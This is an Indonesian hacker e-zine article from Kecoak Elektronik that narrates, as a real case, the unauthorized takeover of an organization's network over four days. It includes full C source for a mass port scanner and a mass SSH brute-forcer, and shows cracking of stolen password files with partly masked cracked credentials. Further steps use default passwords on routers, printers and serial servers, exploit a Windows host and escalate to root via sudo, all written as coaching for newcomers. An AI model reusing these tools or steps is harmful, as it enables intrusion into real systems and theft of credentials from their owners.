@@ -1,0 +1,860 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+
+####################################################################
+TOKET NEWBIE EDITION - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Massive Take Over Servers - Compromise The Network 
+Writer    : Someone [at] kecoak elektronik
+Contact   : Someone [at] kecoak elektronik :)
+Style     : Unicode Transformation Format (UTF-8)
+                
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+
+--[2]-- Introduction
+
+
+Artikel ini dimaksudkan untuk memberikan gambaran kepada para pendatang
+baru apa yang seharusnya dilakukan setelah selesai melakukan takeover
+sebuah server. DEFACE without a great reasons is just for STUPID KIDDIE 
+or FUCKING LAMMERZ. 
+
+Cerita ini diambil dari salah satu kasus nyata massive owning yang 
+dilakukan oleh salah satu staff kecoak elektronik. Biasanya artikel 
+seperti ini yang sangat diharapkan oleh para newbie, tentu saja kami 
+bisa sebanyak mungkin menyebarkan artikel yang bersifat praktikal untuk 
+membantu newbie tapi kami tidak melakukannya karena kami tidak pernah 
+menginginkan hacking scene di indonesia hanya diisi oleh ulah para 
+newbie. Selain itu kami juga tidak menginginkan anda menjadi newbie.
+
+And now the story is begun.....
+
+
+
+--[3]-- First Day
+
+
+<Staff Kecoak A> Ehh, katanya kau maniak AIX??
+<Staff Kecoak B> Iya..
+<Staff Kecoak B> Kamu ada ndes??
+<Staff Kecoak A> Ini ada beberapa gateway OpenBSD
+<Staff Kecoak A> Ada server ber IP lokal AIX 5.3
+<Staff Kecoak A> Mau??
+<Staff Kecoak B> Ok..
+
+
+Yah, salah seorang staff kecoak elektronik akhirnya memberikan akses 
+ke mesin OpenBSD 3.7 dan AIX 5.3 yang sudah dia takeover. Sesaat 
+kemudian saya login ke kedua mesin itu. 
+
+- Backup /etc/security/passwd di AIX 5.3
+- Backup /etc/master.passwd di OpenBSD 3.7
+- Backup /etc/hosts di OpenBSD dan AIX
+- Backup ~/.ssh/known_hosts
+- Baca HISTFILE di ~/.bash_history
+- Baca file output ssh keylogger
+
+Yang ingin saya ceritakan disini bukanlah bagaimana menggaining server
+OpenBSD 3.7 dan AIX 5.3 tapi bagaimana tindak lanjut setelah anda 
+memperoleh akses ke sebuah server untuk mendukung gaining ke hampir 
+semua mesin yang menjadi infratruktur dalam sebuah network.
+
+Persiapan yang saya lakukan bermodal Backdoor SSH tentunya dengan keylog
+gernya, kemudian mendownload John The Ripper (JTR) ( http://openwall.com ). 
+Untuk persiapan scanning dan gaining ke server-server lain saya merakit
+sebuah mass scanner yang berguna untuk melakukan probing port telnet 
+dan ssh secara massive, membuat sebuah mass telnet brute forcer, dan 
+sebuah mass ssh brute semua saya tulis menggunakan bahasa C di 
+kombinasi dengan bash. (SARAN : Jika anda cukup familiar dengan expect 
+scripting silakan gunakan expect saja, saya punya beberpa PoC tapi tidak 
+di disclose ke public).
+
+Anyway, berikut ini kedua code mass scanner dan mass ssh brute forcenya,
+untuk mass telnet brutenya gagal dipakai karena proses authentikasi 
+nya berbeda beda untuk beragam jenis mesin yang berbeda.
+
+
+shell~>cat masscan.c
+
+/*
+ * Grab banner port ssh dan telnet
+ * Keyboard Warrior [at] k-elektronik!!
+ * Happy owning noob
+ */
+
+#include "stdio.h"
+#include "sys/types.h"
+#include "sys/socket.h"
+#include "string.h"
+#include "netdb.h"
+#include "netinet/in.h"
+#include "fcntl.h"
+#define TIMEOUT 3 
+#define ERROR -1
+#define SIZE 1024
+#define FILEHOST "host.txt"
+#define CHILDREN 100
+
+/*HERE YOU NEED TO CONFIGURE BY YOURSELF*/
+#define PORT_TO_GRAB 2
+int port[]={22,23};
+
+int con_timeout(int sf,struct sockaddr *alamat,socklen_t dawa,int timeout)
+{
+	int res,slen,flags;
+	struct timeval tv;
+	struct sockaddr_in      almt;
+	fd_set rdf,wrf;
+
+	fcntl(sf,F_SETFL,O_NONBLOCK);
+	res = connect(sf,alamat,dawa);
+	if (res>=0)return res;
+
+	FD_ZERO(&rdf);
+	FD_ZERO(&wrf);
+	FD_SET(sf, &rdf);
+	FD_SET(sf, &wrf);
+	bzero(&tv, sizeof(tv));
+	tv.tv_sec = timeout;
+
+	if (select(sf + 1, &rdf, &wrf, 0, &tv) <= 0)
+	return -1;
+	if (FD_ISSET(sf, &wrf) || FD_ISSET(sf, &rdf)) {
+		slen = sizeof(almt);
+		if (getpeername(sf, (struct sockaddr*)&almt, &slen) == -1)
+		return -1;
+		flags = fcntl(sf, F_GETFL, NULL);
+		fcntl(sf, F_SETFL, flags & ~O_NONBLOCK);
+		return 0;
+	}
+	return -1;
+}
+
+
+tcp_connect(char *server,int port)
+{
+	int sock;
+	struct hostent *helo;
+	struct sockaddr_in address;
+	FILE *fd1,*fd2,*fd3,*fd4;
+	char servbuf1[SIZE],servbuf2[SIZE];	
+	
+	fd1=fopen("SSHHOST.TXT","a");
+	fd2=fopen("TELNETHOST.TXT","a");
+	fd3=fopen("SSHBANNER.TXT","a");
+	fd4=fopen("TELNETBANNER.TXT","a");
+
+	if((sock=socket(AF_INET,SOCK_STREAM,0))<0){
+		printf("Gagal bikin socket\n");	
+		exit(0);
+	}
+
+	helo = gethostbyname(server);
+	if(helo == NULL){
+		printf("\nGa bisa resolve host %s\n",server);
+		exit(0);
+	}
+
+	bzero((char *) &address, sizeof(address));
+	address.sin_family = AF_INET;
+	bcopy( (char *)helo->h_addr,(char *)&address.sin_addr.s_addr,helo->h_length);
+	address.sin_port = htons(port);
+
+	if(con_timeout(sock,(struct sockaddr*)&address,sizeof(address),TIMEOUT)==ERROR){
+		printf("port %d is close\n",port);
+	}
+	else
+	{
+		if(port==22){
+			printf("[%s] port %d is open\n",server,port);
+			fprintf(fd1,"%s\n",server);
+			recv(sock,servbuf1,SIZE-1,0);
+			fprintf(fd3,"%s\n%s\n\n",server,servbuf1);
+			
+		}
+		else if(port==23){
+			printf("[%s] port %d is open\n",server,port);
+			fprintf(fd2,"%s\n",server);
+			recv(sock,servbuf2,SIZE-1,0);
+			fprintf(fd4,"%s\n%s\n\n",server,servbuf2);
+		}
+		else{
+			printf("Port ndak di definisi\n");
+		}
+			
+		
+	}
+	fclose(fd1);
+	fclose(fd2);
+	fclose(fd3);
+	fclose(fd4);
+	close(sock);
+}
+
+int main(int argc,char *argv[]){
+	
+	int i,status;
+	FILE *fp;
+	char IP[32];
+	
+	if((fp=fopen(FILEHOST,"r"))==NULL)
+	{
+		printf("ga ada file daftar host\n");
+		exit(0);
+	}
+	
+	while((fgets(IP,sizeof(IP),fp)) != NULL)
+	{
+		IP[strlen(IP) - 1] = '\0';
+		switch (fork())
+		{
+			case 0:
+			{
+				for(i=0;i<PORT_TO_GRAB;i++){
+				tcp_connect(IP,port[i]);
+				}
+				_exit(0);
+				break;
+			}
+			case -1:
+			{
+ 				printf("fork error\n");
+				_exit(0);
+				break;
+			}
+			default:
+			{
+				if(i > CHILDREN - 2)
+				{
+					wait(&status);
+					i--;
+				}
+				break;
+			}
+		} //end switch
+	} //end while
+} //end main
+
+
+Selesai dengan code masscan.c, saya mulai mencari code SSH Brute force
+dan kebetulan saya menemukan sebuah code C yang cukup menarik buatan Zorg
+#texter www.wget.home.ro. Cari saja codenya di 
+http://securitydot.net/exploits/
+Modifikasi yang cukup signifikan dari code Zorg saya lakukan dan hasil
+oprekan kecoak elektronik sebagai berikut.
+
+
+shell~>cat sshbrute.c
+/*
+* You need libssh-1 to compile this code
+* Compile gcc -o brute brute.c -lssh
+* Original version by Zorg of #texter www.wget.home.ro
+* Modified by someone at k-elektronik
+*/
+
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <libssh/libssh.h>
+#include <libssh/sftp.h>
+#include <fcntl.h>
+#define CHILDREN 100
+#define HOSTSSH "host.txt"
+
+int flag;
+int where;
+
+void checkauth(char *user,char *password,char *host)
+{
+        char warn[125]="";
+        SSH_SESSION *session;
+        SSH_OPTIONS *options;
+        int argc=1;
+        char *argv[]={"none"};
+        FILE *fp;
+
+        fp=fopen("LOGSSHVULN.TXT","a");
+        alarm(10);
+        options=ssh_getopt(&argc,argv);
+        options_set_username(options,user);
+        options_set_host(options,host);
+        session=ssh_connect(options);
+        if(!session) return ;
+
+        if(ssh_userauth_password(session,NULL,password) != AUTH_SUCCESS)
+        {
+                printf("%s:%s:%s -> BaD Password\n",user,password,host);
+                ssh_disconnect(session);
+                return;
+        }else{
+                printf("%sOk.TRY This : %s:%s:%s\n",warn,user,password,host);
+                fprintf(fp,"%sOk.TRY This : %s:%s:%s\n",warn,user,password,host);
+        }
+        fclose(fp);
+}
+
+int main(int argc, char **argv)
+{
+        FILE *fp;
+        char buff[1024];
+        int i,status;
+
+
+        if(argc!=3)
+        {
+                printf("./bigssh <user> <pass>\n");
+                exit(0);
+        }
+        fp=fopen(HOSTSSH,"r");
+        if(fp==NULL) exit(printf("file not found\n"));
+
+        while(fgets(buff,sizeof(buff),fp))
+        {
+                buff[strlen(buff) - 1] = '\0';
+                switch (fork())
+                {
+                        case 0:
+                        {
+                                checkauth(argv[1],argv[2],buff);
+                                _exit(0);
+                                break;
+                        }
+                        case -1:
+                        {
+                                printf("fork error\n");
+                                _exit(0);
+                                break;
+                        }
+                        default:
+                        {
+                                if(i > CHILDREN - 2)
+                                {
+                                        wait(&status);
+                                        i--;
+                                }
+                                break;
+                        } // end default
+                }//end switch
+        }//end while
+}//end main
+
+Untuk keperluan bruteforce dengan banyak user dan password, saya lengkapi 
+SSH brutenya dengan sebuah bash script sederhana sebagai berikut:
+
+shell~>cat mass.sh
+#!/bin/sh
+cat userlist.txt |awk -F : '{ brutessh="./sshbrute "$1" "$2;system(brutessh)}'
+#EoF
+
+Malam yang melelahkan but who cares??
+
+
+
+--[3]-- Second Day
+
+
+Saya mulai oprek file /etc/master.passwd dan /etc/security/passwd.
+Dengan menggunakan JTR saya mulai melakukan cracking kedua file
+password tersebut sambil mengoprek ssh brute force agar libssh-1
+bisa diganti dengan libssh-2.
+
+Tapi faktor keberuntungan kayaknya jauh dari saya, libssh-0.2 error
+saat kompilasi di *BSD family (OpenBSD 3.9, OpenBSD 3.7 dan FreeBSD
+6.1 RELEASE) walaupun saat saya kompile di fedora linux ndak ada
+error sama sekali (SUKSES), kelihatannya emang bugs dari code
+libssh-0.2 saat kompilasi di *BSD family. Padahal mesin yang siap
+untuk brute force adalah mesin OpenBSD 3.7, sedangkan brute force ke
+server-server target mereka hanya bisa dilakukan digateway atau lokal
+network mereka dan ga mungkin dari luar. libssh-0.2 yang tidak bisa
+di compile :
+
+http://freshmeat.net/redir/libssh/54537/url_tgz/libssh-0.2.tgz
+
+Searching solusi di google, tapi mbah google pun ndak bisa bantu :(
+Mungkin temen - temen bertanya, lah kok ndak pakek libssh-0.1 aja 
+mbah??!!
+ada beberapa perbedaan fungsi dan konstanta di header file 
+libssh-0.2 dan libssh-0.1 diantaranya yang mau saya pakei di ssh 
+brute force :
+
+libssh-0.2 : dari /usr/include/libssh/libssh.h
+SSH_AUTH_SUCCESS        0
+ssh_options_set_username(SSH_OPTIONS *opt, char *username)
+ssh_options_set_host(SSH_OPTIONS *opt, char *host)
+
+libssh-0.1 : dari /usr/include/libssh/libssh.h
+AUTH_SUCCESS    0
+options_set_username(SSH_OPTIONS *opt, char *username)
+options_set_username(SSH_OPTIONS *opt, char *host)
+
+dan mungkin beberapa perbedaan lagi, baca sendiri aja header 
+filenya. 
+
+shell~>cp /etc/master.passwd shadowbsd.txt
+shell~>cp /etc/security/passwd shadowaix.txt
+shell~>john -si shadowbsd.txt
+(till the end..)
+shell~>john -si shadowaix.txt
+(till the end..)
+shell~>john --wordlist:lower --rules shadowaix.txt
+(till the end..)
+shell~>john --wordlist:lower --rules shadowbsd.txt
+(CTRL+C)
+shell~>john --incremental shadowaix.txt
+(CTRL+C)
+shell~>john --incremental shadowbsd.txt
+(CTRL+C)
+shell~>john --show shadowaix.txt > cracked.aix
+shell~>john --show shadowbsd.txt > cracked.bsd
+shell~>tail -13 cracked.aix
+rdhillon:guru
+zohrab:jennyb
+tuc2:taunton
+tclab:taunton
+ekgsc:ekg
+schhabra:schhabra
+zaidi:julia
+lapena:bettya
+sadiq:sadiq
+endo:endo
+reza:reza
+
+242 password hashes cracked, 69 left
+shell~>tail -4 cracked.bsd
+foxxxx:foxxxx1:1010:1010::0:0:xxxxxxxx:/home/xxxx:/bin/ksh
+gerxxxx:anna1:1011:1011::0:0:xxxxxxxx:/home/xxxx:/bin/ksh
+
+6 password hashes cracked, 14 left
+
+lucky factor banyak sekali yang bisa di crack :
+
+- Untuk OpenBSD hanya 6 plaintext dari 20 hash password (blowfish 32/32)
+- Untuk AIX diperoleh 242 plaintext dari 301 hash password (DES 32/24)
+
+Hmmm....., modal yang cukup bagus untuk bruteforce.
+But What the Hell, i'm failed creating SSH Brute force with libssh-2
+May be coz i'm so sleepy or just coz i'm lamme using libssh-2.
+
+
+
+--[4]-- Third day
+
+
+Setelah semua code saya siapkan, tahap gaining dimulai saya login ke 
+box OpenBSD kemudian melakukan mass scanning telnet dan SSH, kurang 
+beruntung dari ratusan hosts yang ada di /etc/hosts AIX dan OpenBSD,
+yang menjalankan telnet dan SSH sangat sedikit, berikut lokal
+IP yang saya peroleh :
+
+-= TELNET =-
+
+CISCO 2800 series
+192.168.11.2
+192.168.11.3
+192.168.11.7
+192.168.11.9
+
+Precidia Technologies Ether232Plus
+192.168.11.4
+
+HP JetDirect
+192.168.11.18
+192.168.11.19
+192.168.11.60
+192.168.11.204
+192.168.11.205
+192.168.11.209 
+192.168.11.254
+
+MS TELNET WINDOWS
+192.168.11.116
+192.168.11.192
+
+Digi International PortServer
+192.168.12.2
+192.168.12.3
+192.168.12.4
+192.168.12.5
+
+EPSON FX-890 network printer
+192.168.10.20
+
+-= OpenSSH =-
+
+192.168.11.20
+SSH-1.99-OpenSSH_4.5
+
+192.168.7.1
+SSH-1.99-OpenSSH_4.5
+
+10.2.60.28
+SSH-1.99-OpenSSH_4.5
+
+192.168.11.5
+SSH-1.99-OpenSSH_3.8.1p1
+
+192.168.12.7
+SSH-1.99-OpenSSH_4.1
+
+192.168.12.7
+SSH-1.99-OpenSSH_4.1
+
+192.168.12.30
+SSH-1.99-OpenSSH_4.2
+
+192.168.12.31
+SSH-1.99-OpenSSH_4.2
+
+192.168.12.32
+SSH-1.99-OpenSSH_4.2
+
+192.168.12.33
+SSH-1.99-OpenSSH_4.2
+
+192.168.12.34
+SSH-1.99-OpenSSH_4.2
+
+192.168.11.5
+SSH-1.99-OpenSSH_3.8.1p1
+
+192.168.11.20
+SSH-1.99-OpenSSH_4.5
+
+192.168.11.100
+SSH-1.99-OpenSSH_4.2
+
+192.168.11.101
+SSH-1.99-OpenSSH_4.2
+
+192.168.11.191
+SSH-2.0-OpenSSH_4.2
+
+
+Daftar Host di brute SSH nya
+192.168.12.7
+192.168.12.30
+192.168.12.31
+192.168.12.32
+192.168.12.33
+192.168.12.34
+192.168.11.100
+192.168.11.101
+192.168.11.191
+
+
+Note : IP 192.168.11.20, 192.168.7.1, 10.2.60.28 tidak disertakan 
+       karena itu IP box OpenBSD yang saya pakek, 192.168.11.5 
+       adalah box AIX yang sebagian besar passwordnya uda dicrack.
+
+Brute force SSH segera saya mulai..
+
+shell~>head -15 sshbrute.c
+/*
+* You need libssh-1 to compile this code
+* Compile gcc -o brute brute.c -lssh
+* Original version by Zorg of #texter www.wget.home.ro
+* Modified by someone at k-elektronik
+*/
+
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <libssh/libssh.h>
+#include <libssh/sftp.h>
+#include <fcntl.h>
+shell~>gcc -o sshbrute sshbrute.c -lssh
+shell~>cat mass.sh
+#!/bin/sh
+cat userlist.txt |awk -F : '{ brutessh="./sshbrute "$1" "$2;system(brutessh)}'
+#EoF
+shell~>LEN=$(cat cracked.aix|awk -F : '{print $1":"$2}'|wc -l)
+shell~>TOT=$(($LEN-2))
+shell~>cat cracked.aix|awk -F : '{print $1":"$2}'|head -$TOT > userlist.txt
+shell~>LEN=$(cracked.bsd|awk -F : '{print $1":"$2}'|wc -l)
+shell~>TOT=$(($LEN-2))
+shell~>cat cracked.bsd|awk -F : '{print $1":"$2}'|head -$TOT >> userlist.txt
+shell~>tail -4 userlist.txt
+arxx:lxxxx2
+ebxxx:ebxxx-xxmin
+foxxxx:foxxxx1
+gerxxxx:anna1
+shell~>./mass.sh 
+Ok.TRY This : foxxxx:foxxxx1:192.168.12.7
+ok.Try This : gerxxxx:anna1:192.168.12.7
+Ok.TRY This : arxx:lxxxx2:192.168.12.7
+Ok.TRY This : ebxxx:ebxxx-xxmin:192.168.12.7
+Ok.TRY This : ranxx:ranxxxxx:192.168.12.7
+
+Hmmm, apes mungkin yahh?? Hanya dapet 5 user dalam sebuah mesin
+dari 9 mesin ssh. Saya coba login ke 192.168.12.7 diperoleh IP 
+publiknya 70.52.xxx.xxx. Well done i'm in the server, wow OpenBSD
+3.7. I don't have any fucking OpenBSD 3.7 exploits so..??
+
+
+Sebelum saya lanjut ke gaining root, saya penasaran dengan server
+-server telnetnya siapa tau banyak yang masih default passwordnya, 
+dimulai dari 4 cisco 2800 series, YAHOOO.. dari empat IP, ada satu 
+IP yang passwordnya masih default 'cisco' untuk login vty via telnet, 
+dan enable password 'cisco' untuk ke priviledge exec mode.
+
+shell~>telnet 192.168.11.9
+Trying 192.168.11.9...
+Connected to 192.168.11.9.
+Escape character is '^]'.
+
+
+User Access Verification
+
+Password:
+2811-HO>enable
+Password:
+2811-HO#sh startup-config
+Using 2467 out of 245752 bytes
+!
+version 12.3
+service timestamps debug uptime
+service timestamps log datetime
+no service password-encryption
+!
+hostname 2811-HO
+!
+boot-start-marker
+boot-end-marker
+!
+enable password cisco
+
+...dan seterusnya...
+
+Belum puas dengan box openbsd dan cisco yang baru didapet, saya 
+mencoba melakukan koneksi telnet ke beberapa printers.
+
+shell~>telnet 192.168.11.18
+Trying 192.168.11.18...
+Connected 192.168.11.18.
+Escape character is '^]'.
+HP JetDirect
+Password is not set
+
+Please type "menu" for the MENU system,
+or "?" for help, or "/" for current settings.
+>
+> /
+   ===JetDirect Telnet Configuration===
+   HP JetDirect       : J7934A
+   Firmware Version   : V.28.06
+   Manufacturing ID   : 25804450902580
+   Hardware Address   : 00:0E:7F:DB:BE:F2
+   System Up Time     : 940:03:03
+
+      GENERAL____________________________________
+      Admin Password     : Not Specified
+      System Location    : Not Specified
+      System Contact     : Not Specified
+      SSL state          : 2
+
+      TCP/IP MAIN________________________________
+      Host Name          : NPIDBBEF2
+      IP Config Method   : DHCP
+      IP Address         : 192.168.11.18
+      Subnet Mask        : 255.255.255.0     (Read-Only)
+      Default Gateway    : 192.168.11.1        (Read-Only)
+      Config Server      : 192.168.11.254      (Read-Only)
+      TFTP Server        : Not Specified     (Read-Only)
+      TFTP Filename      : Not Specified     (Read-Only)
+Press RETURN to continue:
+
+
+Wah...., kali ini bener - bener beruntung, dapet 6 printer managable 
+HP ber IP :
+
+192.168.11.18
+192.168.11.19
+192.168.11.60
+192.168.11.204
+192.168.11.205
+192.168.11.254
+
+Hmmmm, namun cuma printer tapi ndak papa nambah koleksi take over 
+IP address, Game for today is over...  
+
+
+--[5]-- Fourth day
+
+
+
+Hell yeah..!! Hari ini saya planning hari terakhir melakukan massive
+gaining. Hari kemaren sukses mentakeover 5 user OpenBSD, 1 cisco 
+2811 full priviledge, dan 6 printer HP full priviledge. Nahh, sekarang 
+dilanjut ke 'Digi International Port Server' What's that?? What's login
+and default password?? Cari di google!! Dapet dehhh...
+
+http://www.digi.com/products/serialservers/portserverts816.jsp
+http://www.digi.com/support/kbaseresultdetl.jsp?id=472
+
+Ternyata login defaultnya 'root' dan passwordnya 'dbps' kita coba ke 
+192.168.12.2
+
+shell~>telnet 192.168.12.2
+Trying 192.168.12.2...
+Connected to 192.168.12.2.
+Escape character is '^]'.
+
+Digi International
+PortServer 8
+
+login: root
+passwd:
+#> who
+tty username nsess   connected_from     connected_to
+ 36 root         0    192.168.11.20      local_shell
+#>
+
+Gotchaa!!, SUKSES. Kemudian saya coba ke IP yang lain dan ternyata
+semua menggunakan user & password default. Berikut IP yang ditakeover :
+
+192.168.12.2, login:root, pass:dbps
+192.168.12.3, login:root, pass:dbps
+192.168.12.4, login:root, pass:dbps
+192.168.12.5, login:root, pass:dbps
+
+Hmmm, I feel fucking boring now, akhirnya saya mencoba untuk gaining
+windows telnet server, dohh!! telnetbrutenya ndak disiapin untuk keperluan
+gaining windows. Well 'windows', inget kata windows langsung saja saya
+dengan cepat menggunakan nmap melakukan scanning ke port 135 dan 139
+ke network 192.168.11.0/24 dan 192.168.12.0/24. 
+
+shell~>sudo nmap -sV -vv -p135,139 -P0 -O 192.168.11.0/24
+shell~>sudo nmap -sV -vv -p135,139 -P0 -O 192.168.12.0/24
+
+Ternyata banyak sekali IP address yang port 135 dan 139 terbuka, sayangnya 
+nmap mengidentify sebagai WinXP SP2 atau Win2003 untuk sebagian besar host, 
+hanya beberapa yang Win2000. Karena mulai males dan merasa aksi saya kali 
+ini gak ada motif kusus saya hanya mencoba DCOM exploit ke salah satu IP ber
+OS win2000. Saya menggunakan DCOM exploits buatan OC security dan sesaat
+kemudian prompt windows muncul, yah satu koleksi PC lagi saya take over
+(IP 192.168.11.6). Karena memang tujuannya buat fun dan cuma nguji script
+yang saya siapkan di 'dua hari pertama' saya tidak melanjutkan take over
+mesin - mesin windows. Alasannya bosen dan break-in ke PC windows memang
+bukan tipe saya.
+
+Jadi inget mesin OpenBSD yang belum digaining rootnya saya coba login
+menggunakan user foxxxx ke mesin ber IP 192.168.12.7 menggunakan modal
+foxxxx:foxxxx1:192.168.12.7
+shell~> ssh foxxxx@192.168.12.7
+foxxxx@192.168.12.7's password:
+Last login: Tue Jan 30 11:10:34 2007 from xxxxxxxxxxxxxxxxx.com
+OpenBSD 3.7-stable (GENERIC) #0: Mon Jun 20 16:35:32 EDT 2005
+
+---------------------------------------------------------------------------
+You are entering a PRIVATE server. All transactions into and out of the
+system, including your IP address and identity are fully logged. Any
+unauthorized access to this network will be severly punished to the
+fullest extent of the law. Please proceed with EXTREME caution and may
+the force be with you!!!
+--------------------------------------------------------------------------
+
+
+$ cat /etc/group |grep whe
+wheel:*:0:root,swaxxxx,rtxxxx,radxxx,arxx,pxx,stxxx,cexxx,us
+
+wow, lucky arxx ternyata di group wheel, dengan modal user arxx dan password
+laxxx2, saya ganti user dari foxxxx ke arxx.
+
+$ su arxx
+Password:
+$ id
+uid=1000(arxx) gid=1000(arxx) groups=1000(arxx), 0(wheel)
+$ cat /etc/master.passwd
+cat: /etc/master.passwd: Permission denied
+$ cat /etc/sudoers
+# sudoers file.
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# See the sudoers man page for the details on how to write a sudoers file.
+#
+# Host alias specification
+# User alias specification
+# Cmnd alias specification
+# Defaults specification
+# User privilege specification
+arxx    ALL=(ALL) ALL
+root    ALL=(ALL) ALL
+kexxx ALL=NOPASSWD: /usr/local/bin/pico, /bin/cp, /usr/local/sbin/squid, /sbin/reboot, /sbin/shutdown
+
+# Uncomment to allow people in group wheel to run all commands
+# %wheel        ALL=(ALL)       ALL
+
+# Same thing without a password
+# %wheel        ALL=(ALL)       NOPASSWD: ALL
+
+# Samples
+# %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom
+# %users  localhost=/sbin/shutdown -h now
+
+$ sudo su
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password: <laxxx2>
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
+# uname -a
+OpenBSD xxxxxxxxxxxxxxxx.com 3.7 GENERIC#0 i386
+
+
+How luck!!, user arxx di izinkan menggunakan sudo terhadap semua command
+termasuk 'sudo su'. For noob : rooting tidak melulu menggunakan exploits
+gunakan pengetahuanmu tentang sistem operasi.
+
+Singkatnya hari keempat sukses mentakeover 4 digi portserver full priviledge,
+1 mesin windows 2000, dan 1 root OpenBSD 3.7 stable. Waktunya backdooring
+
+
+GAME OVER!!
+
+
+--[6]-- Penutup
+
+
+We're watching you as well..!!
+Silent, anonymous, stealth, invisible
+Long live undergroundz!!
+
+Update : Sat Aug 25 22:34:44 CDT 2007 
